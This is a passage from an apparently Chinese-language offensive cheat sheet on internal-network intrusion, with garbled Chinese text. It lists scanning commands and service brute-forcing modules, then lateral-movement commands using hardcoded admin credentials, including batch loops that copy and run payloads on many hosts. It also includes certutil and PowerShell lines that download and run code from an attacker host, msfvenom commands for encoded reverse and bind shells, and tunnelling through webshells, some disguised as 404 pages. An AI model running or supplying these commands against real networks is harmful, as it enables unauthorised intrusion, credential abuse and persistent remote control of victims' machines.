<h5 id="Nishang-2"><a href="#Nishang-2" class="headerlink" title="Nishang"></a>Nishang</h5><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Scan/Invoke-PortScan.ps1&#39;); Invoke-Portscan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort&quot;
</code></pre>
<p><img src="./img/320.png" alt="image"></p>
<pre><code>å»æ‰scanportå°±æ˜¯æ¢æµ‹å­˜æ´»
</code></pre>
<h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><pre><code>https://github.com/ShawnDEvans/smbmap
</code></pre>
<h5 id="MSF-7"><a href="#MSF-7" class="headerlink" title="MSF"></a>MSF</h5><pre><code>#use auxiliary/scanner/smb/smb_versionæŸ¥è¯¢å¼€å¯139ï¼Œ445ç«¯å£ä¸»æœº
#use auxiliary/scanner/smb/smb_login çˆ†ç ´
</code></pre>
<h5 id="NMAP-2"><a href="#NMAP-2" class="headerlink" title="NMAP"></a>NMAP</h5><pre><code>#nmap -sU -sS --script smb-enum-shares.nse -p 445 192.168. 1.119
</code></pre>
<h5 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h5><pre><code>&gt;for /l %a in (1,1,254) do start /min /low telnet 192.168.1.%a 445
</code></pre>
<h4 id="Linux-SambaæœåŠ¡"><a href="#Linux-SambaæœåŠ¡" class="headerlink" title="Linux SambaæœåŠ¡"></a>Linux SambaæœåŠ¡</h4><pre><code>ç«¯å£ä¸€èˆ¬139ï¼Œå¼±å£ä»¤è¿æ¥
&gt;smbclient -L 192.168.0.110
&gt;smbclient &#39;\\192.168.0.110\IPC$&#39;
#use exploit/linux/samba/is_known_pipenamea
</code></pre>
<h4 id="MSF-8"><a href="#MSF-8" class="headerlink" title="MSF"></a>MSF</h4><h5 id="ç«¯å£"><a href="#ç«¯å£" class="headerlink" title="ç«¯å£"></a>ç«¯å£</h5><pre><code>#use auxiliary/scanner/portscan/tcp
#use auxiliary/scanner/portscan/ack
</code></pre>
<h5 id="æœåŠ¡"><a href="#æœåŠ¡" class="headerlink" title="æœåŠ¡"></a>æœåŠ¡</h5><pre><code>#use auxiliary/scanner/ftp/ftp_version å¼€å¯FTPçš„æœºå™¨
#use auxiliary/scanner/ftp/anonymous å…è®¸åŒ¿åç™»å½•çš„FTP
#use auxiliary/scanner/ftp/ftp_login FTPçˆ†ç ´
#use auxiliary/scanner/http/http_version å¼€å¯HTTPæœåŠ¡çš„
#use auxiliary/scanner/smb/smb_version å¼€å¯SMBæœåŠ¡çš„
#use auxiliary/scanner/smb/smb_enumshares å…è®¸åŒ¿åç™»å½•çš„SMB
#use auxiliary/scanner/smb/smb_login SMBçˆ†ç ´
#use auxiliary/scanner/ssh/ssh_version å¼€å¯SSHçš„æœºå™¨
#use auxiliary/scanner/ssh/ssh_login SSHçˆ†ç ´
#use auxiliary/scanner/telnet/telnet_version å¼€å¯TELNETæœåŠ¡çš„
#use auxiliary/scanner/telnet/telnet_login TELNETçˆ†ç ´
#use auxiliary/scanner/mysql/mysql_version å¼€å¯MYSQLæœåŠ¡çš„
#use auxiliary/scanner/mysql/mysql_login MYSQLçˆ†ç ´
#use auxiliary/scanner/mssql/mssql_ping å¼€å¯SQLSERVERæœåŠ¡çš„
#use auxiliary/scanner/mssql/mssql_login MSSQLçˆ†ç ´
#use auxiliary/scanner/postgres/postgres_versionå¼€å¯POSTGREæœåŠ¡çš„
#use auxiliary/scanner/postgres/postgres_login POSTGRESQLçˆ†ç ´
#use auxiliary/scanner/oracle/tnslsnr_version å¼€å¯oracleæ•°æ®åº“çš„
#use auxiliary/admin/oracle/oracle_login Oracleæ•°æ®åº“çˆ†ç ´
#use auxiliary/scanner/http/title æ‰«æHTTPæ ‡é¢˜
#use auxiliary/scanner/rdp/rdp_scanner å¼€å¯RDPæœåŠ¡çš„
#use auxiliary/scanner/http/webdav_scanner
#use auxiliary/scanner/http/http_put å¼€å¯WEBDAVçš„
#use auxiliary/scanner/smb/smb_ms17_010 å­˜åœ¨17010æ¼æ´çš„
#use auxiliary/scanner/http/zabbix_login zabbixçˆ†ç ´
#use auxiliary/scanner/http/axis_login axisçˆ†ç ´
#use auxiliary/scanner/redis/redis_login redisçˆ†ç ´
</code></pre>
<h4 id="Nc"><a href="#Nc" class="headerlink" title="Nc"></a>Nc</h4><pre><code>&gt;nc -znv 192.168.0.98 1-65535
</code></pre>
<p><img src="./img/321.png" alt="image"></p>
<pre><code>&gt;nc -v -w 1 192.168.0.110 -z 1-1000
&gt;for i in &#123;101..102&#125;; do nc -vv -n -w 1 192.168.0.$i 21-25 -z; done
</code></pre>
<h4 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h4><pre><code>$sudo apt-get install clang git gcc make libpcap-dev
$git clone https://github.com/robertdavidgraham/masscan
$cd masscan
$make 
&gt;masscan -p80,3389,1-65535 192.168.0.0/24
</code></pre>
<p><img src="./img/322.png" alt="image"></p>
<h4 id="PTScan"><a href="#PTScan" class="headerlink" title="PTScan"></a>PTScan</h4><pre><code>å‹å¥½è¯†åˆ«webæœåŠ¡
https://github.com/phantom0301/PTscan/blob/master/PTscan.py
&gt;python PTscan.py &#123;-f /xxx/xxx.txt or -h 192.168.1&#125; [-p 21,80,3306]  [-m 50] [-t 10] [-n(ä¸ping)] [-b(å¼€å¯banneræ‰«æ)] [-ræŸ¥æ‰¾IP]
80,81,82,83,84,85,86,87,88,89,90,91,901,18080,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,443,8443,7001
</code></pre>
<h4 id="CobaltStrike-K8-Aggressor"><a href="#CobaltStrike-K8-Aggressor" class="headerlink" title="CobaltStrike+K8 Aggressor"></a>CobaltStrike+K8 Aggressor</h4><pre><code>https://github.com/k8gege/Aggressor
</code></pre>
<h5 id="å­˜æ´»ä¸»æœº"><a href="#å­˜æ´»ä¸»æœº" class="headerlink" title="å­˜æ´»ä¸»æœº"></a>å­˜æ´»ä¸»æœº</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 OnlinePC
</code></pre>
<p><img src="./img/323.png" alt="image"></p>
<h5 id="MS17010"><a href="#MS17010" class="headerlink" title="MS17010"></a>MS17010</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 MS17010
</code></pre>
<p><img src="./img/324.png" alt="image"></p>
<h5 id="æ“ä½œç³»ç»Ÿä¿¡æ¯"><a href="#æ“ä½œç³»ç»Ÿä¿¡æ¯" class="headerlink" title="æ“ä½œç³»ç»Ÿä¿¡æ¯"></a>æ“ä½œç³»ç»Ÿä¿¡æ¯</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 Osscan
</code></pre>
<p><img src="./img/325.png" alt="image"></p>
<h5 id="å†…ç½‘ç«™ç‚¹bannerã€æ ‡é¢˜æ‰«æ"><a href="#å†…ç½‘ç«™ç‚¹bannerã€æ ‡é¢˜æ‰«æ" class="headerlink" title="å†…ç½‘ç«™ç‚¹bannerã€æ ‡é¢˜æ‰«æ"></a>å†…ç½‘ç«™ç‚¹bannerã€æ ‡é¢˜æ‰«æ</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 WebScan
</code></pre>
<h5 id="FTPçˆ†ç ´"><a href="#FTPçˆ†ç ´" class="headerlink" title="FTPçˆ†ç ´"></a>FTPçˆ†ç ´</h5><pre><code>ä¸Šä¼ è´¦æˆ·å¯†ç æ–‡ä»¶user.txtã€pass.txtåˆ°beaconç›®å½•(beacon&gt;pwd)
beacon&gt;Cscan 192.168.0.0/24 FtpScan
</code></pre>
<h5 id="WMIçˆ†ç ´windowsè´¦æˆ·å¯†ç "><a href="#WMIçˆ†ç ´windowsè´¦æˆ·å¯†ç " class="headerlink" title="WMIçˆ†ç ´windowsè´¦æˆ·å¯†ç "></a>WMIçˆ†ç ´windowsè´¦æˆ·å¯†ç </h5><pre><code>ä¸Šä¼ è´¦æˆ·å¯†ç æ–‡ä»¶user.txtã€pass.txtåˆ°beaconç›®å½•(beacon&gt;pwd)
beacon&gt;Cscan 192.168.0.0/24 WmiScan
</code></pre>
<h5 id="æ€ç§‘è®¾å¤‡æ‰«æ"><a href="#æ€ç§‘è®¾å¤‡æ‰«æ" class="headerlink" title="æ€ç§‘è®¾å¤‡æ‰«æ"></a>æ€ç§‘è®¾å¤‡æ‰«æ</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 CiscoScan
</code></pre>
<h5 id="æšä¸¾å…±äº«"><a href="#æšä¸¾å…±äº«" class="headerlink" title="æšä¸¾å…±äº«"></a>æšä¸¾å…±äº«</h5><pre><code>beacon&gt; EnumShare
</code></pre>
<h5 id="æšä¸¾SQL-SERVERæ•°æ®åº“"><a href="#æšä¸¾SQL-SERVERæ•°æ®åº“" class="headerlink" title="æšä¸¾SQL SERVERæ•°æ®åº“"></a>æšä¸¾SQL SERVERæ•°æ®åº“</h5><pre><code>beacon&gt; EnumMSSQL
</code></pre>
<h3 id="æ‰§è¡Œå‘½ä»¤-amp-IPC-amp-è®¡åˆ’ä»»åŠ¡"><a href="#æ‰§è¡Œå‘½ä»¤-amp-IPC-amp-è®¡åˆ’ä»»åŠ¡" class="headerlink" title="æ‰§è¡Œå‘½ä»¤&amp;IPC&amp;è®¡åˆ’ä»»åŠ¡"></a>æ‰§è¡Œå‘½ä»¤&amp;IPC&amp;è®¡åˆ’ä»»åŠ¡</h3><pre><code>å»ºç«‹è¿æ¥
&gt;net use \\192.168.1.2\ipc$ &quot;password&quot; /user:domain\administrator
æŸ¥çœ‹è¿æ¥
&gt;net use
åˆ—æ–‡ä»¶
&gt;dir \\192.168.1.2\c$
æŸ¥çœ‹ç³»ç»Ÿæ—¶é—´
&gt;net time \\192.168.1.2
ä¸Šä¼ æ–‡ä»¶
&gt;copy 1.exe \\192.168.1.2\c$
ä¸‹è½½æ–‡ä»¶
&gt;copy \\192.168.1.2\c$\1.exe 1.exe
æ‰¹é‡IPC
@echo off
echo check ip addr config fileâ€¦
if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end
echo read and analysis fileâ€¦
for /F &quot;eol=#&quot; %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p &quot;123456&quot; cmd &amp; start cmd /c PsExec.exe \\%%i -u administrator -p &quot;123456&quot; cmd
:end
exit
</code></pre>
<h4 id="AT"><a href="#AT" class="headerlink" title="AT"></a>AT</h4><pre><code>&gt;net use \\192.168.1.2\ipc$ &quot;password&quot; /user:domain\administrator
&gt;copy 1.exe \\192.168.1.2\c$
&gt;net time \\192.168.1.2
&gt;at \\192.168.1.2 1:00AM c:\1.exe
&gt;at \\192.168.1.2 1:00AM cmd.exe /c â€œipconfig &gt;c:/1.txtâ€
&gt;type \\192.168.1.2\c$\1.txt
æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡
&gt;at \\192.168.1.2
åˆ é™¤è®¡åˆ’ä»»åŠ¡
&gt;at \\192.168.1.2 è®¡åˆ’ID /delete
æ¨ªå‘æ‰¹é‡ä¸Šçº¿
&gt;atexec.exe ./administrator:pass@10.1.1.1 &quot;certutil.exe -urlcache -split -f http://youip.com:80/shell.txt c:/windows/debug/SysDug.exe&quot; 
&gt;atexec.exe ./administrator:pass@10.1.1.1 &quot;c:/windows/debug/SysDug.exe&quot; 
&gt;atexec.exe ./administrator:pass@10.1.1.1 &quot;certutil.exe -urlcache -split -f c:/windows/debug/SysDug.exe delete&quot;
</code></pre>
<h4 id="Schtasks-1"><a href="#Schtasks-1" class="headerlink" title="Schtasks"></a>Schtasks</h4><pre><code>&gt;net use \\192.168.0.55\ipc$ &quot;password&quot; /user:&quot;domain\administrator&quot;
&gt;schtasks /query /fo LIST /v æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡
ä¸Šä¼ æ–‡ä»¶
&gt;copy ok.exe \\192.168.0.55\c$\windows\temp
è¿œç¨‹åˆ›å»ºå®šæ—¶ä»»åŠ¡ 
&gt;schtasks /create /s &quot;192.168.0.55&quot; /u &quot;admin&quot; /p &quot;qqq23&quot; /RL HIGHEST /F /tn &quot;windowsupdate&quot; /tr &quot;c:\windows\temp\ok.exe&quot; /sc DAILY /mo 1 /ST 20:28 /RU SYSTEM
æŸ¥è¯¢è¿œç¨‹åˆ›å»ºçš„ä»»åŠ¡
&gt;schtasks /query /s &quot;192.168.0.55&quot; /U &quot;admin&quot; /P &quot;qqq23&quot; | findstr &quot;windowsupdate&quot; 
ç«‹å³æ‰§è¡Œè¿œç¨‹ä»»åŠ¡
&gt;schtasks /run /tn windowsupdate /s &quot;192.168.0.55&quot; /U &quot;admin&quot; /P &quot;qqq23&quot; 
åˆ é™¤å®šæ—¶ä»»åŠ¡ 
&gt;schtasks /Delete /tn windowsupdate /F /s &quot;192.168.0.55&quot; /u &quot;admin&quot; /p &quot;qqq23&quot;
åˆ é™¤IPC
&gt;net user name /del /y
æ¨ªå‘æ‰¹é‡ä¸Šçº¿
&gt;for /f %i in (ip.txt) do net use \\%i\admin$ /user:&quot;administrator&quot; &quot;password&quot; &amp; if %errorlevel% equ 0 ( copy ok.exe \\%i\admin$\debug\ /Y ) &amp; wmic /NODE:&quot;%i&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\windows\debug\ok.exe&quot; &amp; @ping 127.0.0.1 -n 8 &gt;nul &amp; net use \\%i\admin$ /del
</code></pre>
<h4 id="WMIC-1"><a href="#WMIC-1" class="headerlink" title="WMIC"></a>WMIC</h4><pre><code>&gt;net use \\192.168.0.55\ipc$ &quot;password&quot; /user:&quot;domain\administrator&quot;
&gt;copy ok.exe \\192.168.0.55\c$\windows\temp
&gt;wmic /NODE:&quot; 192.168.0.55&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\windows\temp\ok.exe&quot;
&gt;del \\192.168.0.55\c$\windows\temp\ok.exe /F
&gt;net use \\192.168.0.55\c$ /del
</code></pre>
<h3 id="å¿«é€Ÿå®šä½åŸŸç®¡ç†ç™»è¿‡çš„æœºå™¨"><a href="#å¿«é€Ÿå®šä½åŸŸç®¡ç†ç™»è¿‡çš„æœºå™¨" class="headerlink" title="å¿«é€Ÿå®šä½åŸŸç®¡ç†ç™»è¿‡çš„æœºå™¨"></a>å¿«é€Ÿå®šä½åŸŸç®¡ç†ç™»è¿‡çš„æœºå™¨</h3><pre><code>&gt;psexec â€“accepteula @ips.txt â€“u admin â€“p pass@123 â€“c 1.bat
#1.batå†…å®¹
tasklist /v | find â€œåŸŸç®¡ç†åå­—â€
@echo off
echo check ip addr config fileâ€¦
if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end
echo read and analysis fileâ€¦
for /F â€œeol=#â€ %%i in (ip.txt) do echo %%i &amp;(echo %%i &amp;tasklist /s %%i /u administrator /p pass@123 /v) &gt;&gt;d:\result.txt
:end
exit
</code></pre>
<h3 id="MSFæ·»åŠ è·¯ç”±"><a href="#MSFæ·»åŠ è·¯ç”±" class="headerlink" title="MSFæ·»åŠ è·¯ç”±"></a>MSFæ·»åŠ è·¯ç”±</h3><pre><code># route add å†…ç½‘ç½‘å¡ip å­ç½‘æ©ç  sessionçš„id
# route list
&amp;
Meterpreter&gt;run get_local_subnetsæŸ¥çœ‹ç½‘æ®µä¿¡æ¯å†æ·»åŠ è·¯ç”±
# run autoroute -så†…ç½‘ç½‘å¡ip/24
# run autoroute -p æŸ¥çœ‹è·¯ç”±è¡¨
&amp;
Meterpreter&gt;run post/multi/manage/autoroute
</code></pre>
<h3 id="MSFç®¡é“ç›‘å¬"><a href="#MSFç®¡é“ç›‘å¬" class="headerlink" title="MSFç®¡é“ç›‘å¬"></a>MSFç®¡é“ç›‘å¬</h3><pre><code>åœ¨å·²ç»è·å¾—meterpreterçš„æœºå™¨ä¸Šé…ç½®ç®¡é“ç›‘å¬å™¨
meterpreter &gt; pivot add -t pipe -l å·²æ§IP -n bgpipe -a x86 -p windows
ç”Ÿæˆ
&gt;msfvenom -p windows/meterpreter/reverse_named_pipe PIPEHOST=å·²æ§IP PIPENAME=bgpipe -f exe -o pipe.exe.
</code></pre>
<h3 id="ä»£ç†-1"><a href="#ä»£ç†-1" class="headerlink" title="ä»£ç†"></a>ä»£ç†</h3><h4 id="SSH-2"><a href="#SSH-2" class="headerlink" title="SSH"></a>SSH</h4><h5 id="æ­£å‘ä»£ç†"><a href="#æ­£å‘ä»£ç†" class="headerlink" title="æ­£å‘ä»£ç†"></a>æ­£å‘ä»£ç†</h5><pre><code>SSHåŠ¨æ€è½¬å‘ï¼Œæ˜¯å»ºç«‹æ­£å‘åŠ å¯†çš„socksé€šé“
å‡ºç½‘é¶æœºç¼–è¾‘årestart sshæœåŠ¡
#vim /etc/ssh/sshd_conf
AllowTcpForwarding yes å…è®¸TCPè½¬å‘
GatewayPorts yes   å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°è½¬å‘çš„ç«¯å£
TCPKeepAlive yes    TCPä¼šè¯ä¿æŒå­˜æ´»
PasswordAuthentication yes  å¯†ç è®¤è¯
å¤–éƒ¨æ”»å‡»æœºæ‰§è¡Œ
&gt;ssh -C -f -N -g -D 0.0.0.0:12138 root@å‡ºç½‘é¶æœºIP -p 22
MSFä¸­è®¾ç½®å…¨å±€ä»£ç†æˆ–ä½¿ç”¨å…¶ä»–è½¯ä»¶
&gt;setg proxies socks5:0.0.0.0:12138
å³å¯è¿›è¡Œæ”»å‡»éš”ç¦»åŒºæœºå™¨
</code></pre>
<p><img src="./img/326.png" alt="image"><br><img src="./img/327.png" alt="image"></p>
<h5 id="åå‘ä»£ç†"><a href="#åå‘ä»£ç†" class="headerlink" title="åå‘ä»£ç†"></a>åå‘ä»£ç†</h5><pre><code>#vim /etc/ssh/sshd_conf
AllowTcpForwarding yes å…è®¸TCPè½¬å‘
GatewayPorts yes   å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°è½¬å‘çš„ç«¯å£
TCPKeepAlive yes    TCPä¼šè¯ä¿æŒå­˜æ´»
PasswordAuthentication yes  å¯†ç è®¤è¯
ClientAliveInterval ä¿®æ”¹ä¸º30-60ä¿æŒè¿æ¥
ClientAliveCountMax å–æ¶ˆæ³¨é‡Š å‘é€è¯·æ±‚æ²¡å“åº”è‡ªåŠ¨æ–­å¼€æ¬¡æ•°
107æ˜¯å¤–ç½‘æ”»å‡»æœº
å†…ç½‘é¶æœºæ‰§è¡Œï¼š
&gt;ssh -p 22 -qngfNTR 12138:127.0.0.1:22 root@192.168.0.107
</code></pre>
<p><img src="./img/328.png" alt="image"></p>
<pre><code>æ”»å‡»æœºæ‰§è¡Œ
&gt;ssh -p 12138 -qngfNTD 12345 root@192.168.0.107
</code></pre>
<p><img src="./img/329.png" alt="image"></p>
<pre><code>éš§é“å»ºç«‹ï¼Œå¯ä½¿ç”¨ä»£ç†è½¯ä»¶é…ç½®æ”»å‡»æœºå¤–ç½‘IP:12345è®¿é—®å†…ç½‘
</code></pre>
<p><img src="./img/330.png" alt="image"></p>
<h5 id="SSHéš§é“-rc4åŒé‡åŠ å¯†"><a href="#SSHéš§é“-rc4åŒé‡åŠ å¯†" class="headerlink" title="SSHéš§é“+rc4åŒé‡åŠ å¯†"></a>SSHéš§é“+rc4åŒé‡åŠ å¯†</h5><pre><code>ç”Ÿæˆæœ¨é©¬
&gt;msfvenom -p windows/x64/meterpreter/bind_tcp_rc4 rc4password=123456 lport=446 -f exe -o /var/www/html/bind.exe
MSFè®¾ç½®
&gt;setg proxies socks5:0.0.0.0:12138
&gt;use exploit/multi/handler
&gt;set payload windows/x64/meterpreter/bind_tcp_rc4
&gt;set rc4password 123456
&gt;set rhost 10.1.1.97
&gt;set lport 446
</code></pre>
<p><img src="./img/331.png" alt="image"></p>
<h5 id="å…¬ç½‘SSHéš§é“-Local-MSF"><a href="#å…¬ç½‘SSHéš§é“-Local-MSF" class="headerlink" title="å…¬ç½‘SSHéš§é“+Local MSF"></a>å…¬ç½‘SSHéš§é“+Local MSF</h5><pre><code>&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/shikata_ga_nai -i 5 -b â€˜\x00â€™ LHOST=å…¬ç½‘IP LPORT=12138 -f exe â€“o /var/www/html/1.exe
Handlerç›‘å¬æœ¬åœ°IP:12138
SSHè½¬å‘
&gt;ssh -N -R 12138:æœ¬åœ°å†…ç½‘IP:12138 root@å…¬ç½‘IP
</code></pre>
<h4 id="socks4a"><a href="#socks4a" class="headerlink" title="socks4a"></a>socks4a</h4><pre><code>#use auxiliary/server/socks4a
#set srvhost 0.0.0.0
#set srvport 1080
#run
å¤šå±‚ç½‘ç»œ
å†å¤šé…ç½®ä¸ªç«¯å£
Win: Proxifier&amp; Sockscap64
Linux: proxychains&amp; æµè§ˆå™¨
&amp;
meterpreter &gt; ipconfig 
IP Address : 10.1.13.3 
meterpreter &gt; run autoroute -s 10.1.13.0/24 
meterpreter &gt; run autoroute -p 
10.1.13.0 255.255.255.0 Session 1 
meterpreter &gt; bg 
msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec 
msf exploit(psexec) &gt; set RHOST 10.1.13.2 
msf exploit(psexec) &gt; exploit 
</code></pre>
<h4 id="socks5"><a href="#socks5" class="headerlink" title="socks5"></a>socks5</h4><pre><code>#use auxiliary/server/socks5
#set srvhost 0.0.0.0
#set srvport 1080
#run
æµè§ˆå™¨
</code></pre>
<h4 id="åŸºäºwebçš„socks5"><a href="#åŸºäºwebçš„socks5" class="headerlink" title="åŸºäºwebçš„socks5"></a>åŸºäºwebçš„socks5</h4><h5 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h5><pre><code>https://github.com/sensepost/reGeorg
&gt;python reGeorgSocksProxy.py -u http://é¶æœº/tunnel.aspx -l å¤–ç½‘IP -p 10080
æ‰“å¼€Proxifierï¼Œæ›´æ”¹ä¸ºè„šæœ¬æŒ‡å®šçš„ç«¯å£10080
</code></pre>
<p><img src="./img/332.png" alt="image"></p>
<pre><code>æˆ–proxychains
#vim /etc/proxychains.conf
å»æ‰dynamic_chainæ³¨é‡Š&gt;æ·»åŠ socks5 127.0.0.1 10080
</code></pre>
<p><img src="./img/333.png" alt="image"></p>
<pre><code>æˆ–MSF
&gt;setg proxies socks5:å¤–ç½‘IP:10080
&gt;setg ReverseAllowProxy true å…è®¸åå‘ä»£ç†
</code></pre>
<p><img src="./img/334.png" alt="image"></p>
<h5 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h5><pre><code>Step 1. è®¾ç½®å¯†ç ç”Ÿæˆ tunnel.(aspx|ashx|jsp|jspx|php) å¹¶ä¸Šä¼ åˆ°WEBæœåŠ¡å™¨
$ python3 neoreg.py generate -k password
</code></pre>
<p><img src="./img/335.png" alt="image"></p>
<pre><code>ä¼ªè£…é¡µé¢
$ python3 neoreg.py generate -k &lt;you_password&gt; --file 404.html
Step 2. ä½¿ç”¨ neoreg.py è¿æ¥WEBæœåŠ¡å™¨ï¼Œåœ¨æœ¬åœ°å»ºç«‹ socks ä»£ç†
$ python3 neoreg.py -k password -u http://xx/tunnel.php
$ python3 neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --skip
å¼€å¯ä»£ç†
$ python neoreg.py -k &lt;you_password&gt; -l å¤–ç½‘IP -p 10081 -u http://xx/neo-tunnel.aspx
</code></pre>
<p><img src="./img/336.png" alt="image"><br><img src="./img/337.png" alt="image"></p>
<h5 id="ABPTTSç«¯å£è½¬å‘"><a href="#ABPTTSç«¯å£è½¬å‘" class="headerlink" title="ABPTTSç«¯å£è½¬å‘"></a>ABPTTSç«¯å£è½¬å‘</h5><pre><code>https://github.com/nccgroup/ABPTTS
ç«¯å£è½¬å‘
&gt;python abpttsfactory.py -o webshell ç”Ÿæˆshell
./webshellç›®å½•ä¸‹ç”Ÿæˆçš„ç›¸åº”è„šæœ¬æ–‡ä»¶ä¼ å…¥ç›®æ ‡ä¸­
&gt;python abpttsclient.py -c webshell/config.txt -u &quot;http://ç›®æ ‡ç½‘å€/trans.aspx&quot; -f æ”»å‡»æœºIP:12345/ç›®æ ‡IP:3389
</code></pre>
<p><img src="./img/338.png" alt="image"><br><img src="./img/339.png" alt="image"><br><img src="./img/340.png" alt="image"></p>
<pre><code>ABPTTSè½¬å‘å†…ç½‘å…¶ä»–æœºå™¨ç«¯å£
&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.105:3389
</code></pre>
<p><img src="./img/341.png" alt="image"><br><img src="./img/342.png" alt="image"></p>
<pre><code>è¦è½¬å‘å¤šä¸ªæœºå™¨æˆ–å¤šä¸ªç«¯å£
&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.105:3389 -f 192.168.0.107:33891/10.1.1.101:80 -f 192.168.0.107:33892/10.1.1.102:22
SSHä»£ç†ä¸€çº§ç½‘æ®µ
éœ€è¦ä¸€å°æœ‰æƒé™çš„Linuxé¶æœº
&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.108:22
&gt;ssh -p 222 -qTfnN -D 0.0.0.0:1081 root@192.168.0.107
</code></pre>
<p><img src="./img/343.png" alt="image"></p>
<pre><code>é…ç½®proxychainså³å¯
</code></pre>
<p><img src="./img/344.png" alt="image"></p>
<pre><code>SSHä»£ç†äºŒçº§ç½‘æ®µ
éœ€è¦é¶æœºwebæƒé™ï¼Œä¸€çº§å†…ç½‘ä¸€å°webæƒé™
è½¬å‘å†…ç½‘webå‡ºæ¥ä¼ å…¥abpttsçš„shell
&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:8080/10.1.1.108:80 
&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.107/qq.aspx -f 192.168.0.107:222/10.1.1.106:22
SSHè¿æ¥192.168.0.107:222å³å¯åˆ°è¾¾äºŒçº§ç½‘ç»œ
åå¼¹msf
kaliç”Ÿæˆbindå‹è„šæœ¬
&gt;msfvenom -p linux/x64/shell_bind_tcp LPORT=12138 -f elf -o shell
åœ¨äºŒçº§ä¸å‡ºç½‘linuxä¸Šæ‰§è¡Œ
å°†ä»–çš„12138ç«¯å£é€šè¿‡abpttsè½¬å‡º
&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:13128/10.1.1.101:12138
Msfæœ¬åœ°ç›‘å¬13128å³å¯
</code></pre>
<h5 id="Tunnaè½¬å‘"><a href="#Tunnaè½¬å‘" class="headerlink" title="Tunnaè½¬å‘"></a>Tunnaè½¬å‘</h5><pre><code>&gt;python proxy.py -u http://192.168.0.98/tunnel.aspx -l 12138 -r 3389 â€“v
</code></pre>
<p><img src="./img/345.png" alt="image"></p>
<h4 id="Earthworm"><a href="#Earthworm" class="headerlink" title="Earthworm"></a>Earthworm</h4><p><img src="./img/346.png" alt="image"></p>
<h5 id="æ­£å‘-ç›®æ ‡æœºå­˜åœ¨å¤–ç½‘IP-ï¼š"><a href="#æ­£å‘-ç›®æ ‡æœºå­˜åœ¨å¤–ç½‘IP-ï¼š" class="headerlink" title="æ­£å‘(ç›®æ ‡æœºå­˜åœ¨å¤–ç½‘IP)ï¼š"></a>æ­£å‘(ç›®æ ‡æœºå­˜åœ¨å¤–ç½‘IP)ï¼š</h5><pre><code>&gt;ew â€“s ssocksd â€“l 888
è¿æ¥sockscap64é¶æœºå¤–ç½‘IP+ç«¯å£888
</code></pre>
<h5 id="åå¼¹socks5-ç›®æ ‡æœºæ— å¤–ç½‘IP-ï¼š"><a href="#åå¼¹socks5-ç›®æ ‡æœºæ— å¤–ç½‘IP-ï¼š" class="headerlink" title="åå¼¹socks5(ç›®æ ‡æœºæ— å¤–ç½‘IP)ï¼š"></a>åå¼¹socks5(ç›®æ ‡æœºæ— å¤–ç½‘IP)ï¼š</h5><pre><code>å¤–ç½‘æ”»å‡»æœºï¼š
&gt;ew -s rcsocks -l 1008 -e 888
-lä¸ºsocksè½¯ä»¶è¿æ¥çš„ç«¯å£ï¼Œ-eä¸ºç›®æ ‡ä¸»æœºå’Œvpsçš„é€šä¿¡ç«¯å£ã€‚
é¶æœº:
&gt;ew -s rssocks -d å¤–ç½‘IP -e 1008 
sockscap64è¿æ¥æ”»å‡»æœºå¤–ç½‘IP+ç«¯å£1008
</code></pre>
<h5 id="äºŒçº§ç¯å¢ƒ-Aæœ‰å¤–ç½‘ï¼ŒBå†…ç½‘æ— å¤–ç½‘-ï¼š"><a href="#äºŒçº§ç¯å¢ƒ-Aæœ‰å¤–ç½‘ï¼ŒBå†…ç½‘æ— å¤–ç½‘-ï¼š" class="headerlink" title="äºŒçº§ç¯å¢ƒ(Aæœ‰å¤–ç½‘ï¼ŒBå†…ç½‘æ— å¤–ç½‘)ï¼š"></a>äºŒçº§ç¯å¢ƒ(Aæœ‰å¤–ç½‘ï¼ŒBå†…ç½‘æ— å¤–ç½‘)ï¼š</h5><pre><code>é¶æœºB:
&gt;ew â€“s ssocksd â€“l 888
é¶æœºA:
&gt;ew â€“s lcx_tran â€“l 1080 â€“f é¶æœºB â€“g 888
Sockscap64è¿æ¥é¶æœºå¤–ç½‘IP+ç«¯å£ 1080
</code></pre>
